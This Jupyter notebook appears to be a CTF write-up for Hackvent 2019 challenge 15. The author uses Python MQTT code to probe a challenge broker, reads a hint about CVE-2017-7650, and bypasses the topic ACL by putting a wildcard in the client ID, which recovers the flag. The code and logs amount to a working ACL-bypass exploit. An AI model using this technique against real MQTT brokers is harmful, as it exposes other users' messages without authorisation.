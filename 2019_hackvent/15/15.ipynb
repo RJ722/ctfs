{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# HV19.15 Santa's Workshop\n",
    "\n",
    "*The Elves are working very hard. Look at http://whale.hacking-lab.com:2080/ to see how busy they are.*\n",
    "        \n",
    "On that website, we can find a counter:\n",
    "    \n",
    "![Website screenshot](./elves.png)\n",
    "\n",
    "Looking at the JavaScript source, we find a [MQTT](https://en.wikipedia.org/wiki/MQTT) connection used to increment the counter. We also find out that the flag seems to be published via MQTT as well:\n",
    "\n",
    "```js\n",
    "var topic = 'HV19/gifts/'+clientid;\n",
    "// var topic = 'HV19/gifts/'+clientid+'/flag-tbd';\n",
    "```\n",
    "\n",
    "I started with replicating what the website does in Python - I first didn't get it to run, until I got a hint that I need to set `transport=\"websockets\"` for it to be equivalent with the JavaScript code. I also added a counter so that the loop automatically exits after getting 5 messages. I mainly use that to have a clean way to exit the mainloop for this writeup.\n",
    "\n",
    "After that, I got gift counter messages via Python and [paho-mqtt](https://pypi.org/project/paho-mqtt/):"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "DEBUG:paho.mqtt.client:Sending CONNECT (u1, p1, wr0, wq0, wf0, c1, k60) client_id=b'0483191873374145'\n",
      "DEBUG:paho.mqtt.client:Received CONNACK (0, 0)\n",
      "DEBUG:paho.mqtt.client:Sending SUBSCRIBE (d0, m1) [(b'HV19/gifts/0483191873374145', 0)]\n",
      "DEBUG:paho.mqtt.client:Received SUBACK\n",
      "DEBUG:paho.mqtt.client:Received PUBLISH (d0, q0, r0, m0), 'HV19/gifts/0483191873374145', ...  (7 bytes)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "HV19/gifts/0483191873374145 b'7596557'\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "DEBUG:paho.mqtt.client:Received PUBLISH (d0, q0, r0, m0), 'HV19/gifts/0483191873374145', ...  (7 bytes)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "HV19/gifts/0483191873374145 b'7596560'\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "DEBUG:paho.mqtt.client:Received PUBLISH (d0, q0, r0, m0), 'HV19/gifts/0483191873374145', ...  (7 bytes)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "HV19/gifts/0483191873374145 b'7596569'\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "DEBUG:paho.mqtt.client:Received PUBLISH (d0, q0, r0, m0), 'HV19/gifts/0483191873374145', ...  (7 bytes)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "HV19/gifts/0483191873374145 b'7596570'\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "DEBUG:paho.mqtt.client:Received PUBLISH (d0, q0, r0, m0), 'HV19/gifts/0483191873374145', ...  (7 bytes)\n",
      "DEBUG:paho.mqtt.client:Sending DISCONNECT\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "HV19/gifts/0483191873374145 b'7596580'\n"
     ]
    }
   ],
   "source": [
    "import logging\n",
    "import paho.mqtt.client as mqtt\n",
    "import itertools\n",
    "\n",
    "\n",
    "CID = \"0483191873374145\"\n",
    "USER = \"workshop\"\n",
    "PASS = \"2fXc7AWINBXyruvKLiX\"\n",
    "HOST = \"whale.hacking-lab.com\"\n",
    "PORT = 9001\n",
    "TOPIC = f\"HV19/gifts/{CID}\"\n",
    "LIMIT = 5\n",
    "\n",
    "counter = None\n",
    "\n",
    "\n",
    "def on_connect(client, userdata, flags, rc):\n",
    "    if rc != 0:\n",
    "        print(f\"Failed to connect: {rc}\")\n",
    "\n",
    "    client.subscribe(TOPIC)\n",
    "    \n",
    "    global counter\n",
    "    counter = itertools.count(start=1)\n",
    "\n",
    "\n",
    "def on_message(client, userdata, msg):\n",
    "    print(msg.topic + \" \" + str(msg.payload))\n",
    "    if next(counter) == LIMIT:\n",
    "        client.disconnect()\n",
    "\n",
    "        \n",
    "def run(client):\n",
    "    client.enable_logger()\n",
    "    logging.basicConfig(level=logging.DEBUG)\n",
    "\n",
    "    client.username_pw_set(USER, PASS)\n",
    "\n",
    "    client.on_connect = on_connect\n",
    "    client.on_message = on_message\n",
    "\n",
    "    client.connect(HOST, PORT)\n",
    "\n",
    "    client.loop_forever()\n",
    "    \n",
    "client = mqtt.Client(client_id=CID, transport=\"websockets\")\n",
    "run(client)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "I then did some reading about MQTT and found out that there are wildcards using [this article](https://www.hivemq.com/blog/mqtt-essentials-part-5-mqtt-topics-best-practices/). Let's try to get everything!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "DEBUG:paho.mqtt.client:Sending CONNECT (u1, p1, wr0, wq0, wf0, c1, k60) client_id=b'0483191873374145'\n",
      "DEBUG:paho.mqtt.client:Received CONNACK (0, 0)\n",
      "DEBUG:paho.mqtt.client:Sending SUBSCRIBE (d0, m2) [(b'#', 0)]\n",
      "DEBUG:paho.mqtt.client:Received SUBACK\n",
      "DEBUG:paho.mqtt.client:Received PUBLISH (d0, q0, r0, m0), 'HV19/gifts/0483191873374145', ...  (7 bytes)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "HV19/gifts/0483191873374145 b'7596661'\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "DEBUG:paho.mqtt.client:Received PUBLISH (d0, q0, r0, m0), 'HV19/gifts/0483191873374145', ...  (7 bytes)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "HV19/gifts/0483191873374145 b'7596664'\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "DEBUG:paho.mqtt.client:Received PUBLISH (d0, q0, r0, m0), 'HV19/gifts/0483191873374145', ...  (7 bytes)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "HV19/gifts/0483191873374145 b'7596673'\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "DEBUG:paho.mqtt.client:Received PUBLISH (d0, q0, r0, m0), 'HV19/gifts/0483191873374145', ...  (7 bytes)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "HV19/gifts/0483191873374145 b'7596677'\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "DEBUG:paho.mqtt.client:Received PUBLISH (d0, q0, r0, m0), 'HV19/gifts/0483191873374145', ...  (7 bytes)\n",
      "DEBUG:paho.mqtt.client:Sending DISCONNECT\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "HV19/gifts/0483191873374145 b'7596686'\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "7"
      ]
     },
     "execution_count": 18,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "TOPIC = \"#\"\n",
    "client.connect(HOST, PORT)\n",
    "client.loop_forever()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Hmm, nothing new there. I'd have expected to also see gift messages for other users at least, but I guess there are some access controls which prevent that.\n",
    "\n",
    "The article above mentions:\n",
    "\n",
    "> Topics that start with a \\$ symbol have a different purpose. These topics are not part of the subscription when you subscribe to the multi-level wildcard as a topic (#). **The \\$-symbol topics are reserved for internal statistics of the MQTT broker.**\n",
    "\n",
    "So let's check whether there's something interesting to see there!"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "DEBUG:paho.mqtt.client:Sending CONNECT (u1, p1, wr0, wq0, wf0, c1, k60) client_id=b'0483191873374145'\n",
      "DEBUG:paho.mqtt.client:Received CONNACK (0, 0)\n",
      "DEBUG:paho.mqtt.client:Sending SUBSCRIBE (d0, m3) [(b'$SYS/#', 0)]\n",
      "DEBUG:paho.mqtt.client:Received PUBLISH (d0, q0, r1, m0), '$SYS/broker/version', ...  (157 bytes)\n",
      "DEBUG:paho.mqtt.client:Sending DISCONNECT\n",
      "DEBUG:paho.mqtt.client:Received SUBACK\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "$SYS/broker/version b'mosquitto version 1.4.11 (We elves are super-smart and know about CVE-2017-7650 and the POC. So we made a genious fix you never will be able to pass. Hohoho)'\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "7"
      ]
     },
     "execution_count": 19,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "TOPIC = f\"$SYS/#\"\n",
    "LIMIT = 1\n",
    "client.connect(HOST, PORT)\n",
    "client.loop_forever()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Oh, that's interesting! The message informs us about [CVE-2017-7650](http://cve.circl.lu/cve/CVE-2017-7650):\n",
    "\n",
    "> In Mosquitto before 1.4.12, pattern based ACLs can be bypassed by clients that set their username/client id to '#' or '+'. This allows locally or remotely connected clients to access MQTT topics that they do have the rights to.\n",
    "\n",
    "From the [related bug report](https://bugs.eclipse.org/bugs/show_bug.cgi?id=516765) and the [attached patch](https://bugs.eclipse.org/bugs/attachment.cgi?id=268603) we get some more information. The upstream patch seems fine, but it looks like the elves fixed it in a different way, which apparently can be circumvented somehow.\n",
    "\n",
    "I first tried the obvious thing, a client ID of `#`, but that doesn't let us connect at all:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "TOPIC = \"#\"\n",
    "CID = \"#\"\n",
    "\n",
    "client = mqtt.Client(client_id=CID, transport=\"websockets\")\n",
    "run(client)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The client ID is part of the published topic as well. So I did a guess - what if I used `0483191873374145/#` as client ID, so that (maybe) the server sends to `HV19/gifts/0483191873374145/#` or so?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "DEBUG:paho.mqtt.client:Sending CONNECT (u1, p1, wr0, wq0, wf0, c1, k60) client_id=b'0483191873374145/#'\n",
      "DEBUG:paho.mqtt.client:Received CONNACK (0, 0)\n",
      "DEBUG:paho.mqtt.client:Sending SUBSCRIBE (d0, m1) [(b'#', 0)]\n",
      "DEBUG:paho.mqtt.client:Received PUBLISH (d0, q0, r1, m0), 'HV19/gifts/0483191873374145/HV19{N0_1nput_v4l1d4t10n_3qu4ls_d1s4st3r}', ...  (70 bytes)\n",
      "DEBUG:paho.mqtt.client:Received SUBACK\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "HV19/gifts/0483191873374145/HV19{N0_1nput_v4l1d4t10n_3qu4ls_d1s4st3r} b'Congrats, you got it. The elves should not overrate their smartness!!!'\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "DEBUG:paho.mqtt.client:Received PUBLISH (d0, q0, r0, m0), 'HV19/gifts/0483191873374145/HV19{N0_1nput_v4l1d4t10n_3qu4ls_d1s4st3r}', ...  (70 bytes)\n",
      "DEBUG:paho.mqtt.client:Received PUBLISH (d0, q0, r0, m0), 'HV19/gifts/0483191873374145', ...  (7 bytes)\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "HV19/gifts/0483191873374145/HV19{N0_1nput_v4l1d4t10n_3qu4ls_d1s4st3r} b'Congrats, you got it. The elves should not overrate their smartness!!!'\n",
      "HV19/gifts/0483191873374145 b'7599123'\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "DEBUG:paho.mqtt.client:Received PUBLISH (d0, q0, r0, m0), 'HV19/gifts/0483191873374145/HV19{N0_1nput_v4l1d4t10n_3qu4ls_d1s4st3r}', ...  (70 bytes)\n",
      "DEBUG:paho.mqtt.client:Received PUBLISH (d0, q0, r0, m0), 'HV19/gifts/0483191873374145', ...  (7 bytes)\n",
      "DEBUG:paho.mqtt.client:Sending DISCONNECT\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "HV19/gifts/0483191873374145/HV19{N0_1nput_v4l1d4t10n_3qu4ls_d1s4st3r} b'Congrats, you got it. The elves should not overrate their smartness!!!'\n",
      "HV19/gifts/0483191873374145 b'7599128'\n"
     ]
    }
   ],
   "source": [
    "LIMIT = 5\n",
    "CID = \"0483191873374145/#\"\n",
    "client = mqtt.Client(client_id=CID, transport=\"websockets\")\n",
    "run(client)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "And indeed, the flag is `HV19{N0_1nput_v4l1d4t10n_3qu4ls_d1s4st3r}`."
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
